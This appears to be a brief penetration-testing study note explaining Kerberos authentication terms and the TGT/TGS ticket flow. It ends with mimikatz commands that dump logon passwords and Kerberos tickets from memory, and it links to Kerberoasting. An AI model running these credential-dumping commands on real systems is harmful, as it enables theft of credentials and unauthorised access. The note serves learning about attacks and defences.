# Kerberos Authentication
KDC -> Key distribution center
SPN -> Service principal name
TGT -> Ticket granting ticket
TGS -> Ticket granting service

Kerberos is stateless.
- Client negotiates authentication using encrypted timestamp with key distribution center
- Client requests TGT to KDC
- Client receives TGT from KDC
- Client requests TGS using TGT and SPN of service
- Client receives TGS for service

To do this automatically:
- [[Kerberoasting]]

## Cached credential storage and retrieval
Mimikatz.exe can be used to achieve this
```
mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::tickets

```


